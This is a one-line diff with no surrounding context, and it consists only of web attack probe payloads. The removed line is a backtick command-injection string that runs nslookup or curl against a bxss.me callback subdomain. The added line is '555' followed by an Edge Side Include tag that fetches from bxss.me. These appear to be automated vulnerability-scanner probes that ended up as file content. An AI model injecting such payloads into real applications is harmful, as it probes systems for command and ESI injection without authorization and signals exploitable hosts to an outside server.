@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitcekpwvekdx8d0f5.bxss.me||curl hitcekpwvekdx8d0f5.bxss.me)`
+555<esi:include src="http://bxss.me/rpb.png"/>
